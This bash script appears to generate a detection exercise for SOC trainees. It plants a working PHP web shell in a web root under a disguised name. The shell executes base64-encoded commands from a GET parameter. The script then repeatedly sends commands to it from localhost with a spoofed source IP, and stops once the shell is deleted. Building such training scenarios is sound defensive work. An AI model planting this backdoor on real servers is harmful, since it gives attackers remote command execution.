#!/bin/bash
# Hard: Active Webshell C2 Attack - plants a PHP backdoor in the web root, then continuously sends shell commands

if [ -f /tmp/micro_soc_state.env ]; then
    source /tmp/micro_soc_state.env
    BACKDOOR_FILE=$BACKDOOR_FILE_NAME
else
    BACKDOOR_NAMES=("backdoor.php" "shell.php" "cmd.php" "wp-config.php.bak" "admin_helper.php")
    BACKDOOR_FILE=${BACKDOOR_NAMES[$((RANDOM % ${#BACKDOOR_NAMES[@]}))]}
    ATTACKER_IP="$((RANDOM % 255 + 1)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"
fi

BACKDOOR="/var/www/html/$BACKDOOR_FILE"

echo "Hard attack scenario: planting backdoor at $BACKDOOR"
if [ ! -f "$BACKDOOR" ]; then
    cat > "$BACKDOOR" << 'EOF'
<?php if(isset($_GET['cmd'])){ @system(base64_decode($_GET['cmd'])); } ?>
EOF
fi

echo "Starting hard scenario attack: backdoor planted ($BACKDOOR_FILE), starting C2 loop from $ATTACKER_IP"
while true; do
    # Check if backdoor was deleted
    if [ ! -f "$BACKDOOR" ]; then
        echo "Backdoor deleted. Exiting attack loop."
        exit 0
    fi

    # Hydra-like attack
    for i in {1..5}; do
        curl -s -H "X-Forwarded-For: $ATTACKER_IP" \
            -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
            "http://localhost/$BACKDOOR_FILE?cmd=$(echo -n 'whoami' | base64)" > /dev/null &
    done
    wait
    sleep 0.2
done
